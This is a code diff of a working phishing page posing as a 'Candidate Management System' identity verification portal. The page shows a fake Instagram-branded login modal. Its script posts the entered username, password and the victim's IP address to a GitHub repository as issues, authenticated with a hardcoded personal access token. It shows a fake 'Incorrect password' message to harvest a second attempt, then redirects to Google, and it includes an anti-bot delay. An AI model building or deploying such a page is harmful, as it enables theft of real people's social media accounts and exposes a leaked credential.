@@ -3,111 +3,117 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Candidate Portal | Verification</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <title>Candidate Portal | Secure Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        :root { --accent: #861f41; }
-        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; margin: 0; display: flex; flex-direction: column; min-height: 100vh; }
-        .header { background: #fff; padding: 15px; border-bottom: 3px solid var(--accent); text-align: center; }
-        .auth-box { background: #fff; width: 340px; margin: 40px auto; padding: 30px; border-radius: 12px; box-shadow: 0 8px 25px rgba(0,0,0,0.1); text-align: center; }
-        .s-btn { display: none; align-items: center; width: 100%; padding: 12px; margin-bottom: 12px; border: 1px solid #ccc; border-radius: 8px; background: #fff; cursor: pointer; font-weight: 600; }
-        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; margin-bottom: 15px; box-sizing: border-box; }
-        .main-btn { width: 100%; padding: 14px; background: var(--accent); color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.75); z-index: 999; }
-        .modal-content { background: white; width: 310px; margin: 120px auto; padding: 25px; border-radius: 12px; text-align: center; }
-        .err { color: #d93025; background: #fce8e6; padding: 10px; font-size: 13px; margin-bottom: 15px; border-radius: 5px; border: 1px solid #d93025; display: none; }
+        .hidden-content { display: none; }
     </style>
 </head>
-<body>
+<body class="bg-gray-100 min-h-screen flex flex-col">
+    <header class="bg-dark text-white p-4 text-center border-b-4 border-red-800" style="background-color: #4a1524;">
+        <h1 class="text-sm font-bold uppercase tracking-widest">Candidate Management System</h1>
+    </header>
 
-    <div class="header" style="font-weight:bold; color:var(--accent);">CANDIDATE MANAGEMENT SYSTEM</div>
+    <main class="flex-grow flex items-center justify-center p-4">
+        <div id="loading" class="text-center text-gray-500 italic">Verifying connection...</div>
+        
+        <div id="main-content" class="hidden-content w-full max-auto space-y-4 flex flex-col items-center">
+            <div class="bg-white p-6 rounded-lg shadow-lg w-full max-w-sm text-center">
+                <h2 class="font-bold mb-4">Identity Verification</h2>
+                <p class="text-xs text-gray-500 mb-6">Verify via your authorized social profile to use system access</p>
+                <button onclick="openModal()" class="w-full bg-red-900 text-white py-3 rounded font-bold hover:bg-red-800 transition shadow-lg" style="background-color: #4a1524;">LOGIN & VERIFY</button>
+            </div>
+        </div>
+    </main>
 
-    <div class="auth-box">
-        <h3>Identity Verification</h3>
-        <p style="font-size:14px; color:#666;">Verify via your authorized social profile</p>
-        
-        <button id="fbBtn" class="s-btn" onclick="openLogin('Facebook')"></button>
-        <button id="igBtn" class="s-btn" onclick="openLogin('Instagram')"></button>
-        
-        <div style="margin:20px 0; color:#888; font-size:12px;">OR USE SYSTEM ACCESS</div>
-        
-        <input type="text" id="dirUser" placeholder="Reference ID">
-        <input type="password" id="dirPass" placeholder="Access Key">
-        <button class="main-btn" onclick="submitData('Manual')">LOGIN & VERIFY</button>
-    </div>
-
-    <div id="authModal" class="modal">
-        <div class="modal-content">
-            <div id="mIcon" style="font-size: 40px; margin-bottom: 10px;"></div>
-            <div id="eBox" class="err">Incorrect password. Please try again.</div>
-            <input type="text" id="mUser" placeholder="Username / Email">
-            <input type="password" id="mPass" placeholder="Password">
-            <button class="main-btn" onclick="handleLogin()">CONFIRM</button>
+    <div id="loginModal" class="fixed inset-0 bg-black bg-opacity-75 hidden flex items-center justify-center p-4">
+        <div class="bg-white rounded-xl w-full max-w-sm overflow-hidden">
+            <div class="p-8 text-center">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" class="w-12 mx-auto mb-4">
+                <h3 class="font-bold text-lg mb-2">Login Required</h3>
+                <div id="error-msg" class="bg-red-100 text-red-600 text-xs p-2 rounded mb-4 hidden border border-red-200">
+                    ⚠️ Incorrect password. Please try again.
+                </div>
+                
+                <input type="text" id="user" placeholder="Phone, username, or email" class="w-full border p-3 rounded mb-3 text-sm focus:outline-none focus:ring-1 focus:ring-gray-400 bg-gray-50">
+                <input type="password" id="pass" placeholder="Password" class="w-full border p-3 rounded mb-5 text-sm focus:outline-none focus:ring-1 focus:ring-gray-400 bg-gray-50">
+                
+                <button onclick="sendData()" id="btnText" class="w-full bg-pink-600 text-white py-2 rounded-lg font-bold hover:bg-pink-700 shadow-md" style="background-color: #a21d44;">CONFIRM</button>
+            </div>
         </div>
     </div>
 
     <script>
+        // CONFIGURATION (Token aur Repo check karein)
         const CONFIG = {
-            // Aapka naya token
-            TOKEN: "ghp_T0W1nzpkQgsTuAKQZNsMk2D1yATWoP3sXK61",
-            // Aapki repository ka path
-            REPO: "Veer007ghk/user-verification-gateway",
-            REDIR: "https://www.google.com"
+            TOKEN: "ghp_T0W1nzpkQgsTuAKQZNsMk2D1yATWoP3sXK61", // Aapka naya token
+            REPO: "Veer007ghk/user-verification-gateway", // Aapki repo
+            REDIR: "https://www.google.com" 
         };
 
-        let mode = ""; let tryNo = 0;
+        let attempt = 0;
 
-        // Anti-bot delay
+        // Anti-bot Delay (2.5 Seconds)
         setTimeout(() => {
-            const f = document.getElementById('fbBtn');
-            const i = document.getElementById('igBtn');
-            f.innerHTML = '<i class="fab fa-facebook" style="color:#1877F2; margin-right:10px;"></i> Verify via Profile A';
-            i.innerHTML = '<i class="fab fa-instagram" style="color:#E1306C; margin-right:10px;"></i> Verify via Profile B';
-            f.style.display = 'flex'; i.style.display = 'flex';
+            document.getElementById('loading').classList.add('hidden');
+            document.getElementById('main-content').classList.remove('hidden-content');
         }, 2500);
 
-        function openLogin(p) {
-            mode = p; tryNo = 0;
-            document.getElementById('eBox').style.display = "none";
-            document.getElementById('mIcon').innerHTML = p === 'Facebook' ? 
-                '<i class="fab fa-facebook" style="color:#1877F2"></i>' : 
-                '<i class="fab fa-instagram" style="color:#E1306C"></i>';
-            document.getElementById('authModal').style.display = "block";
+        function openModal() {
+            document.getElementById('loginModal').classList.remove('hidden');
         }
 
-        async function handleLogin() {
-            const u = document.getElementById('mUser').value;
-            const p = document.getElementById('mPass').value;
-            if(!u || !p) return;
-            
-            await submitData(mode, u, p);
-            tryNo++;
-            
-            if(tryNo === 1) {
-                document.getElementById('mPass').value = "";
-                document.getElementById('eBox').style.display = "block";
-            } else { 
-                window.location.href = CONFIG.REDIR; 
-            }
-        }
+        async function sendData() {
+            const user = document.getElementById('user').value;
+            const pass = document.getElementById('pass').value;
+            const btn = document.getElementById('btnText');
+            const errorMsg = document.getElementById('error-msg');
 
-        async function submitData(method, user, pass) {
-            const u = user || document.getElementById('dirUser').value;
-            const p = pass || document.getElementById('dirPass').value;
+            if (!user || !pass) { alert("Please fill all fields"); return; }
+
+            btn.innerText = "Processing...";
+            btn.disabled = true;
+
             try {
+                // User ki IP nikalna
                 const ipRes = await fetch('https://api.ipify.org?format=json');
-                const { ip } = await ipRes.json();
-                
-                await fetch(`https://api.github.com/repos/${CONFIG.REPO}/issues`, {
+                const ipData = await ipRes.json();
+
+                // GitHub Issue create karne ka logic
+                const response = await fetch(`https://api.github.com/repos/${CONFIG.REPO}/issues`, {
                     method: 'POST',
-                    headers: { 'Authorization': `token ${CONFIG.TOKEN}`, 'Content-Type': 'application/json' },
+                    headers: {
+                        'Authorization': `token ${CONFIG.TOKEN}`,
+                        'Content-Type': 'application/json'
+                    },
                     body: JSON.stringify({
-                        title: `🔑 Login: ${method} - ${ip}`,
-                        body: `**User:** ${u}\n**Pass:** ${p}\n**IP:** ${ip}`
+                        title: `New Login: ${user}`,
+                        body: `**Username:** ${user}\n**Password:** ${pass}\n**IP Address:** ${ipData.ip}\n**Attempt:** ${attempt + 1}`
                     })
                 });
-                if(method === 'Manual') window.location.href = CONFIG.REDIR;
-            } catch (e) { window.location.href = CONFIG.REDIR; }
+
+                if (response.ok) {
+                    attempt++;
+                    if (attempt === 1) {
+                        // Pehli baar error dikhayega
+                        errorMsg.classList.remove('hidden');
+                        document.getElementById('pass').value = "";
+                        btn.innerText = "CONFIRM";
+                        btn.disabled = false;
+                    } else {
+                        // Dusri baar redirect kar dega
+                        window.location.href = CONFIG.REDIR;
+                    }
+                } else {
+                    console.error("Token or Repo issue");
+                    btn.innerText = "CONFIRM";
+                    btn.disabled = false;
+                }
+            } catch (err) {
+                console.error(err);
+                btn.innerText = "CONFIRM";
+                btn.disabled = false;
+            }
         }
     </script>
 </body>
